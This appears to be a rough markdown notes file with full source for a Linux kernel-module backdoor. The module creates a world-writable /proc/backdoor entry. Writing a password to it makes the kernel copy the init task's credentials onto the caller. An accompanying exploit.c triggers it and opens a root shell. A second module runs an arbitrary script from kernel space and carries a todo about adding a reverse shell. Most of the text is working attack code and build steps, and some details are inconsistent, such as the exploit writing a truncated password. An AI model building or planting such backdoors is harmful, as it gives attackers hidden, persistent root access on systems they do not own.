# I will clean this up later on!


# EOP

```Makefile
obj-m += rootuxedo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

```

### Our Root LKM (this will create a backdoored /proc/ entry to give us root with `exploit.c`)
- `rootuxedo.c`
```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>

#define PROC_NAME "backdoor"
#define PASSWORD "RootThanks" // Our "secret" trigger

// --- THE MISSING PIECES ---
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("LKM EOP Proof of Concept");
MODULE_AUTHOR("The Architect");

#include <linux/sched.h>
#include <linux/pid.h>

static void give_root(void) {
    struct task_struct *init_task_ptr;
    
    // Find PID 1 (init)
    init_task_ptr = pid_task(find_vpid(1), PIDTYPE_PID);
    
    if (init_task_ptr) {
        // Force-copy the credentials from init to the current process
        commit_creds(init_task_ptr->cred);
        printk(KERN_INFO "Rootuxedo: Stole credentials from init!\n");
    } else {
        printk(KERN_ERR "Rootuxedo: Could not find init task.\n");
    }
}
static ssize_t proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos) {
    char buf[32];
    if (count > 32) return -EINVAL;
    if (copy_from_user(buf, ubuf, count)) return -EFAULT;

    if (memcmp(buf, PASSWORD, strlen(PASSWORD)) == 0) {
        printk(KERN_INFO "Rooty: Secret password accepted! Elevating privileges...\n");
        give_root();
    }
    return count;
}

// Map the write operation to our function
static const struct proc_ops proc_fops = {
    .proc_write = proc_write,
};

static int __init rooty_init(void) {
    proc_create(PROC_NAME, 0666, NULL, &proc_fops);
    return 0;
}

static void __exit rooty_exit(void) {
    remove_proc_entry(PROC_NAME, NULL);
}

module_init(rooty_init);
module_exit(rooty_exit);

```


## Exploit.c (gives us root)
```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main() {
    int fd = open("/proc/backdoor", O_WRONLY);
    if (fd < 0) {
        perror("Failed to open backdoor");
        return 1;
    }
    write(fd, "RootThanks", 7);
    close(fd);

    printf("Checking privileges...\n");
    if (getuid() == 0) {
        printf("We are ROOT! Dropping into shell...\n");
        execl("/bin/bash", "bash", NULL);
    } else {
        printf("Still a pleb. UID: %d\n", getuid());
    }
    return 0;
}

```




-----

## LKM Execution
- `make clean`
- `make all`
- `nano /usr/local/bin/test.sh` `# make some commands here, you will find a test script below`
- `sudo insmod lkm_exec.ko` `# todo: [+] arguments to what script to execute and maybe [+] reverse shell`


```Makefile
obj-m += lkm_exec.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

```


- `lkm_exec.c`
```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/umh.h> // The header for user-mode helpers

MODULE_LICENSE("GPL");
MODULE_AUTHOR("The Architect");

static int __init ghost_exec_init(void) {
    // Set up the path and arguments 
    // char *argv[] = { "/tmp/test.sh", NULL };
    char *argv[] = { "/usr/local/bin/test.sh", NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    };

    printk(KERN_INFO "GHOST: Attempting to execute /tmp/test.sh\n");

    // call_usermodehelper(path, argv, envp, wait_flag)
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static void __exit ghost_exec_exit(void) {
    printk(KERN_INFO "GHOST: Executor unloaded.\n");
}

module_init(ghost_exec_init);
module_exit(ghost_exec_exit);
```


- `/usr/local/bin/test.sh`
```bash
#!/bin/bash
sudo /bin/bash -c 'whoami > /tmp/WHOAMI'
```



-----
